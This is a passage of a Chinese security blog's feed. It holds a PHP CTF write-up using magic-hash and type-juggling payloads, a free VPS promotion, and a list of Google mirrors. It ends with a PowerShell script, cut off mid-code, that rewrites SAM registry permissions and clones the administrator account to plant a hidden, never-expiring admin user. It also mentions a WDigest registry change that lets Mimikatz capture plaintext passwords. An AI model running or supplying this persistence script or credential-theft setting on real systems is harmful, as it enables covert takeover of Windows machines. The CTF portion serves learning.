</p><p><code>$pass=unserialize(base64_decode($_GET[&#39;pass&#39;]));</code></p><p>它是先解密然后再反序列化, 那么我们就要先序列化在加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if($pass!==&apos;&apos; &amp;&amp;is_array($pass))&#123;</div><div class="line">    $a=$pass[&apos;a&apos;];</div><div class="line">$b=$pass[&apos;b&apos;];</div><div class="line">$c=$pass[&apos;c&apos;];</div></pre></td></tr></table></figure></p><p>同时这里的<code>$pass</code>要是数组</p><p>直接在本地echo序列化的内容</p><p>那么初始代码就是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;a&apos;=&gt;&apos;a&apos;,&apos;b&apos;=&gt;&apos;b&apos;,&apos;c&apos;=&gt;&apos;c&apos;);</div><div class="line">echo base64_encode(serialize($arr));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>不过下面的if就有点变态了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if((md5($a) == md5($b) &amp;&amp; $a !== $b))&#123;</div><div class="line">echo &quot;WOW!&lt;br/&gt;&quot;;</div><div class="line">$v1=1;</div></pre></td></tr></table></figure></p><p><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">http://www.cnblogs.com/Primzahl/p/6018158.html</a></p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>原来要利用php的一个缺陷</p><p>用这两个字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">s878926199a</div><div class="line">0e545993274517709034328855841020</div><div class="line"></div><div class="line">s1091221200a</div><div class="line">0e940624217856561557816327384675</div></pre></td></tr></table></figure></p><p>更改代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;a&apos;=&gt;&apos;s878926199a&apos;,&apos;b&apos;=&gt;&apos;s1091221200a&apos;,&apos;c&apos;=&gt;&apos;c&apos;);</div><div class="line">echo base64_encode(serialize($arr));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>echo输出<br><code>YTozOntzOjE6ImEiO3M6MTE6InM4Nzg5MjYxOTlhIjtzOjE6ImIiO3M6MTI6InMxMDkxMjIxMjAwYSI7czoxOiJjIjtzOjE6ImMiO30=</code></p><p>构造参数</p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/10.jpg" alt="">  </p><p>提交  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/11.jpg" alt=""><br>出现WOW!</p><p>还是if<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(strlen($c)&lt;4 &amp;&amp; $c&gt;99999999)&#123;</div><div class="line">echo &quot;666666!&lt;/br&gt;&quot;;</div><div class="line">$v2=1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>$c要小于4并大于99999999</p><p>这里虽然是strlen, 但没说$c一定要是字符串</p><p>回到本地测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$arr = array(&apos;a&apos;=&gt;&apos;s878926199a&apos;,&apos;b&apos;=&gt;&apos;s1091221200a&apos;,&apos;c&apos;=&gt;array(&apos;aaa&apos;));</div><div class="line">$c = $arr[&apos;c&apos;];</div><div class="line">if(strlen($c)&lt;4 &amp;&amp; $c&gt;99999999)&#123;</div><div class="line">echo &quot;666666!&lt;/br&gt;&quot;;</div><div class="line">&#125;</div><div class="line">echo base64_encode(serialize($arr));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>访问<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/12.jpg" alt=""><br>出现Warning并输出666666!</p><p><code>YTozOntzOjE6ImEiO3M6MTE6InM4Nzg5MjYxOTlhIjtzOjE6ImIiO3M6MTI6InMxMDkxMjIxMjAwYSI7czoxOiJjIjthOjE6e2k6MDtzOjM6ImFhYSI7fX0=</code></p><p>burp构造 提交<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/13.jpg" alt=""><br>继续看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$aa = base64_decode($_GET[&apos;file&apos;]);</div><div class="line">$bb = base64_decode($_GET[&apos;file1&apos;]);</div><div class="line">if((md5($aa) == md5($bb) &amp;&amp; $aa !== $bb))&#123;</div><div class="line">if(encodeSecret($_GET[&apos;onet&apos;]) == $encodedSecret)&#123;</div><div class="line">echo $flag;</div><div class="line">&#125;else&#123;</div><div class="line">echo &apos;come on baby&apos;;</div><div class="line">&#125;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;On On On&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>get传递file1 file2, 同时要用base64加密, 然后是比较md5</p><p>依然用这两个</p><p><code>s878926199a</code></p><p><code>s1091221200a</code><br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/14.jpg" alt=""><br>Go<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/15.jpg" alt=""><br>输出come on baby<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(encodeSecret($_GET[&apos;onet&apos;]) == $encodedSecret)&#123;</div><div class="line">echo $flag;</div><div class="line">&#125;else&#123;</div><div class="line">echo &apos;come on baby&apos;;</div></pre></td></tr></table></figure></p><p>查看encodeSecret<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">function encodeSecret($secret) &#123;</div><div class="line">    return bin2hex(strrev(base64_encode($secret)));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><code>Hash:3d3d516343746d4d6d6c315669563362</code></p><p>bin2hex 转16进制</p><p>转回去 pack(“H*”,bin2hex($str))</p><p>strrev 翻转字符串</p><p>只要再翻转一次就可以了</p><p>回到本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function decodeSecret($str)&#123;</div><div class="line">return base64_decode(strrev(pack(&quot;H*&quot;,$str)));</div><div class="line">&#125;</div><div class="line">echo decodeSecret(&apos;3d3d516343746d4d6d6c315669563362&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/16.jpg" alt="">  </p><p>burp构造, 得到了flag  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/17.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://www.inksec.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@Szrzvdny&lt;/a&gt;大佬的题  &lt;a href=&quot;http://exp10it.tk/2017/11/17/php-code-writeup/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>滴滴云免费两个月服务器</title>
    <link href="http://www.chabug.org/2017/11/10/didiyun-freevps/"/>
    <id>http://www.chabug.org/2017/11/10/didiyun-freevps/</id>
    <published>2017-11-10T04:00:45.000Z</published>
    <updated>2017-11-10T04:05:27.754Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://wx2.sinaimg.cn/mw690/7efa749fly1flby2c14utj20nt0ckwhz.jpg" alt=""><br>滴滴云貌似是滴滴出行搞的云服务。</p><blockquote><p>滴滴云基于滴滴出行的业务技术和经验积累，<br>采用领先的云计算架构、高规格服务器集群搭建、高性能资源配置机制、精细化运营模式，<br>致力于为开发者提供简单快捷、高效稳定、高性价比、安全可靠的IT基础设施云服务。</p></blockquote><p>官网地址<br><a href="https://www.didiyun.com/" target="_blank" rel="external">https://www.didiyun.com/</a></p><p>新人活动<br>新注册滴滴云的用户都可以获得100元新人券。开通最低配置的VPS可以玩2个月！！</p><p>注册步骤<br>访问地址：<a href="https://i.didiyun.com/2d5YwCbUWzj" target="_blank" rel="external">https://i.didiyun.com/2d5YwCbUWzj</a> 注册账号。</p><p>只需要验证邮箱和手机号码！！</p><p>然后账号可以收到100元新人券！！ 开通机器即可！</p><p><strong>开通机器</strong><br>开通机器后登录的用户名不是root。  </p><p>请使用 dc2-user  ，切换到root 请使用命令： su  或者 sudo -i<br><strong>最低配置</strong><br>1核CPU / 512M内存 / 20GSSD / 1M带宽 / KVM虚拟 ≈ 49元/月<br><strong>测试IP</strong><br>103.73.51.200<br><strong>性能测试</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">----------------------------------------------------------------------</div><div class="line">CPU model            : Intel(R) Xeon(R) CPU E5-<span class="number">2650</span> v4 @ <span class="number">2.20</span>GHz</div><div class="line">Number of cores      : <span class="number">1</span></div><div class="line">CPU frequency        : <span class="number">2197.454</span> MHz</div><div class="line">Total size of Disk   : <span class="number">20.0</span> GB (<span class="number">1.0</span> GB Used)</div><div class="line">Total amount of Mem  : <span class="number">996</span> MB (<span class="number">216</span> MB Used)</div><div class="line">Total amount of Swap : <span class="number">0</span> MB (<span class="number">0</span> MB Used)</div><div class="line">System uptime        : <span class="number">0</span> days, <span class="number">0</span> hour <span class="number">11</span> min</div><div class="line">Load average         : <span class="number">0.08</span>, <span class="number">0.02</span>, <span class="number">0.01</span></div><div class="line">OS                   : CentOS <span class="number">6.9</span></div><div class="line">Arch                 : x86_64 (<span class="number">64</span> Bit)</div><div class="line">Kernel               : <span class="number">2.6</span>.<span class="number">32</span>-<span class="number">696.6</span>.<span class="number">3</span>.el6.x86_64</div><div class="line">----------------------------------------------------------------------</div><div class="line">I/O speed(<span class="number">1</span>st run)   : <span class="number">451</span> MB/s</div><div class="line">I/O speed(<span class="number">2</span>nd run)   : <span class="number">536</span> MB/s</div><div class="line">I/O speed(<span class="number">3</span>rd run)   : <span class="number">634</span> MB/s</div><div class="line">Average I/O speed    : <span class="number">540.3</span> MB/s</div><div class="line">----------------------------------------------------------------------</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://wx2.sinaimg.cn/mw690/7efa749fly1flby2c14utj20nt0ckwhz.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;滴滴云貌似是滴滴出行搞的云服务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;滴滴云基于滴滴出行的业务
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Google镜像收集</title>
    <link href="http://www.chabug.org/2017/11/10/google-mirror/"/>
    <id>http://www.chabug.org/2017/11/10/google-mirror/</id>
    <published>2017-11-10T03:09:50.000Z</published>
    <updated>2017-11-10T03:30:11.173Z</updated>
    
    <content type="html"><![CDATA[<h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><p>清单如下，欢迎提供新镜像。  </p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">地址</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">皮皮虾</td><td style="text-align:center"><a href="https://gg.shadowsocksr.se" target="_blank" rel="external">https://gg.shadowsocksr.se</a></td><td style="text-align:center">速度不错</td></tr><tr><td style="text-align:center">sapmogy</td><td style="text-align:center"><a href="https://so.sapmogy.com/" target="_blank" rel="external">https://so.sapmogy.com/</a></td><td style="text-align:center">香港机器速度很快</td></tr><tr><td style="text-align:center">futureisnow</td><td style="text-align:center"><a href="https://gg.futureisnow.cn/" target="_blank" rel="external">https://gg.futureisnow.cn/</a></td><td style="text-align:center">ssl有错误</td></tr><tr><td style="text-align:center">uulucky</td><td style="text-align:center"><a href="https://google.uulucky.com/" target="_blank" rel="external">https://google.uulucky.com/</a></td><td style="text-align:center">完美的反代</td></tr><tr><td style="text-align:center">88DR</td><td style="text-align:center"><a href="http://www.88dr.com/" target="_blank" rel="external">http://www.88dr.com/</a></td><td style="text-align:center">狗爹新加坡空间，较慢</td></tr><tr><td style="text-align:center">光的传人</td><td style="text-align:center"><a href="http://www.liu16.com/g.html" target="_blank" rel="external">http://www.liu16.com/g.html</a></td><td style="text-align:center">有广告</td></tr><tr><td style="text-align:center">学术搜索</td><td style="text-align:center"><a href="https://so.sciencesoft.cn/" target="_blank" rel="external">https://so.sciencesoft.cn/</a></td><td style="text-align:center">非原版Google</td></tr><tr><td style="text-align:center">九尾搜索</td><td style="text-align:center"><a href="https://a.glgooo.top/" target="_blank" rel="external">https://a.glgooo.top/</a></td><td style="text-align:center">有广告</td></tr></tbody></table><h1 id="其他镜像收集站点"><a href="#其他镜像收集站点" class="headerlink" title="其他镜像收集站点"></a>其他镜像收集站点</h1><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">地址</th></tr></thead><tbody><tr><td style="text-align:center">coderschool</td><td style="text-align:center"><a href="https://coderschool.cn/1853.html" target="_blank" rel="external">https://coderschool.cn/1853.html</a></td></tr><tr><td style="text-align:center">思谋导航</td><td style="text-align:center"><a href="http://dir.scmor.com/google/" target="_blank" rel="external">http://dir.scmor.com/google/</a></td></tr><tr><td style="text-align:center">自在板</td><td style="text-align:center"><a href="http://www.zizaifan.com/html/google.html" target="_blank" rel="external">http://www.zizaifan.com/html/google.html</a></td></tr><tr><td style="text-align:center">运维网</td><td style="text-align:center"><a href="https://www.iyunv.com/thread-135490-1-1.html" target="_blank" rel="external">https://www.iyunv.com/thread-135490-1-1.html</a></td></tr><tr><td style="text-align:center">那个孩子萌萌哒 abc</td><td style="text-align:center"><a href="http://weibo.com/ttarticle/p/show?id=2309404043918147773050" target="_blank" rel="external">http://weibo.com/ttarticle/p/show?id=2309404043918147773050</a></td></tr><tr><td style="text-align:center">闫珂的博客</td><td style="text-align:center"><a href="http://yanke.info/google.htm" target="_blank" rel="external">http://yanke.info/google.htm</a></td></tr></tbody></table><h1 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h1><ul><li>2017/11/10 更新可用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;清单&quot;&gt;&lt;a href=&quot;#清单&quot; class=&quot;headerlink&quot; title=&quot;清单&quot;&gt;&lt;/a&gt;清单&lt;/h1&gt;&lt;p&gt;清单如下，欢迎提供新镜像。  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>隐藏用户建立 Powershell</title>
    <link href="http://www.chabug.org/2017/11/09/UserClone/"/>
    <id>http://www.chabug.org/2017/11/09/UserClone/</id>
    <published>2017-11-09T14:37:16.000Z</published>
    <updated>2017-11-09T14:46:51.563Z</updated>
    
    <content type="html"><![CDATA[<p>最近做测试的时候发现，windows server2012 使用Mimikatz是直接抓不到明文密码的，而且，直接创建的账号登陆有时会碰到这个问题：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flc7rmq8coj309i05bglg.jpg" alt=""></p><blockquote><p>ps：2012抓明文需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，才能记录到明文密码。</p></blockquote><p>后来发现以前的建立克隆账号的方式是可以使得新建的账号登陆系统的，为了方便，整理了一个powershell脚本，脚本可以自动修改注册表键值权限（需要用administrator权限运行，及bypassuac以后的权限），之后在进行操作。具体代码如下：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Create-Clone</div><div class="line">&#123;</div><div class="line"><span class="comment">&lt;#</span></div><div class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></div><div class="line"><span class="comment">This script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user.</span></div><div class="line"><span class="comment"><span class="doctag">.PARAMETER u</span></span></div><div class="line"><span class="comment">The clone username</span></div><div class="line"><span class="comment"><span class="doctag">.PARAMETER p</span></span></div><div class="line"><span class="comment">The clone user's password</span></div><div class="line"><span class="comment"><span class="doctag">.PARAMETER cu</span></span></div><div class="line"><span class="comment">The user to clone, default administrator</span></div><div class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></div><div class="line"><span class="comment">Create-Clone -u evi1cg -p evi1cg123 -cu administrator</span></div><div class="line"><span class="comment">#&gt;</span></div><div class="line">    <span class="keyword">Param</span>(</div><div class="line">        [Parameter(Mandatory=<span class="literal">$true</span>)]</div><div class="line">        [String]</div><div class="line">        <span class="variable">$u</span>,</div><div class="line"></div><div class="line">        [Parameter(Mandatory=<span class="literal">$true</span>)]</div><div class="line">        [String]</div><div class="line">        <span class="variable">$p</span>,</div><div class="line"></div><div class="line">        [Parameter(Mandatory=<span class="literal">$false</span>)]</div><div class="line">        [String]</div><div class="line">        <span class="variable">$cu</span> = <span class="string">"administrator"</span></div><div class="line">    )</div><div class="line">    <span class="keyword">function</span> upReg&#123;</div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17] &gt;&gt; <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        cmd /c <span class="string">"regini <span class="variable">$env:temp</span>\up.ini"</span></div><div class="line">        <span class="built_in">Remove-Item</span> <span class="variable">$env:temp</span>\up.ini</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">function</span> downreg &#123;</div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17] &gt;&gt; <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        cmd /c <span class="string">"regini <span class="variable">$env:temp</span>\down.ini"</span></div><div class="line">        <span class="built_in">Remove-Item</span> <span class="variable">$env:temp</span>\down.ini</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">function</span> Create-user ([string]<span class="variable">$Username</span>,[string]<span class="variable">$Password</span>) &#123;</div><div class="line">        <span class="variable">$group</span> = <span class="string">"Administrators"</span></div><div class="line">        <span class="variable">$existing</span> = <span class="built_in">Test-Path</span> -path <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="variable">$Username</span>"</span></div><div class="line">        <span class="keyword">if</span> (!<span class="variable">$existing</span>) &#123;</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[*] Creating new local user <span class="variable">$Username</span> with password <span class="variable">$Password</span>"</span></div><div class="line">            &amp; NET USER <span class="variable">$Username</span> <span class="variable">$Password</span> /add /y /expires:never | <span class="built_in">Out-Null</span></div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[*] Adding local user <span class="variable">$Username</span> to <span class="variable">$group</span>."</span></div><div class="line">            &amp; NET LOCALGROUP <span class="variable">$group</span> <span class="variable">$Username</span> /add | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="variable">$adsi</span> = [ADSI]<span class="string">"WinNT://<span class="variable">$env:COMPUTERNAME</span>"</span></div><div class="line">            <span class="variable">$exist</span> = <span class="variable">$adsi</span>.Children | where &#123;<span class="variable">$_</span>.SchemaClassName <span class="nomarkup">-eq</span> <span class="string">'user'</span> -and <span class="variable">$_</span>.Name <span class="nomarkup">-eq</span> <span class="variable">$Username</span> &#125;</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[*] Setting password for existing local user <span class="variable">$Username</span>"</span></div><div class="line">            <span class="variable">$exist</span>.SetPassword(<span class="variable">$Password</span>)</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">Write-Host</span> <span class="string">"[*] Ensuring password for <span class="variable">$Username</span> never expires."</span></div><div class="line">        &amp; WMIC USERACCOUNT WHERE <span class="string">"Name='<span class="variable">$Username</span>'"</span> SET PasswordExpires=FALSE   | <span class="built_in">Out-Null</span>  </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">function</span> GetUser-Key([string]<span class="variable">$user</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">Test-Path</span> -Path <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="variable">$user</span>"</span>)&#123;</div><div class="line">            cmd /c <span class="string">"regedit /e <span class="variable">$env:temp</span>\<span class="variable">$user</span>.reg "</span>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="variable">$user</span><span class="string">""</span></div><div class="line">            <span class="variable">$file</span> = <span class="built_in">Get-Content</span> <span class="string">"<span class="variable">$env:temp</span>\<span class="variable">$user</span>.reg"</span>  | <span class="built_in">Out-String</span></div><div class="line">            <span class="variable">$pattern</span>=<span class="string">"@=hex\((.*?)\)\:"</span></div><div class="line">            <span class="variable">$file</span> <span class="nomarkup">-match</span> <span class="variable">$pattern</span> |<span class="built_in">Out-Null</span></div><div class="line">            <span class="variable">$key</span> = <span class="string">"00000"</span>+<span class="variable">$matches</span>[<span class="number">1</span>]</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[!]"</span><span class="variable">$key</span></div><div class="line">            <span class="keyword">return</span> <span class="variable">$key</span></div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[-] SomeThing Wrong !"</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">function</span> Clone ([string]<span class="variable">$ukey</span>,[string]<span class="variable">$cukey</span>) &#123;</div><div class="line">        <span class="variable">$ureg</span> = <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="variable">$ukey</span>"</span> |<span class="built_in">Out-String</span></div><div class="line">        <span class="variable">$cureg</span> = <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="variable">$cukey</span>"</span> |<span class="built_in">Out-String</span></div><div class="line">        <span class="built_in">Write-Host</span> <span class="string">"[*] Get clone user'F value"</span></div><div class="line">        <span class="variable">$cuFreg</span> = <span class="built_in">Get-Item</span> -Path <span class="variable">$cureg</span>.Trim()</div><div class="line">        <span class="variable">$cuFvalue</span> = <span class="variable">$cuFreg</span>.GetValue(<span class="string">'F'</span>)</div><div class="line">        <span class="built_in">Write-Host</span> <span class="string">"[*] Change user'F value"</span></div><div class="line">        <span class="built_in">Set-ItemProperty</span> -path <span class="variable">$ureg</span>.Trim()  -Name <span class="string">"F"</span> -value <span class="variable">$cuFvalue</span></div><div class="line">        <span class="variable">$outreg</span> = <span class="string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="variable">$ukey</span>"</span></div><div class="line">        cmd /c <span class="string">"regedit /e <span class="variable">$env:temp</span>\out.reg <span class="variable">$outreg</span>.Trim()"</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">function</span> Main () &#123;</div><div class="line">        <span class="built_in">Write-Output</span> <span class="string">"[*] Start"</span></div><div class="line">        <span class="built_in">Write-Output</span> <span class="string">"[*] Tring to change reg privilege !"</span></div><div class="line">        upReg   </div><div class="line">        <span class="keyword">if</span>( !(<span class="built_in">Test-Path</span> -path <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="variable">$cu</span>"</span>))&#123;</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[-] The User to Clone does not exist"</span></div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Change reg privilege back !"</span></div><div class="line">            downReg   </div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Exiting !"</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">if</span>(!(<span class="built_in">Test-Path</span> -path <span class="string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="variable">$u</span>"</span>))&#123;</div><div class="line">                <span class="variable">$tmp</span> = <span class="string">"1"</span></div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span>&#123;</div><div class="line">                <span class="variable">$tmp</span> = <span class="string">"0"</span></div><div class="line">            &#125;</div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Create User..."</span></div><div class="line">            Create-user <span class="variable">$u</span> <span class="variable">$p</span></div><div class="line">            <span 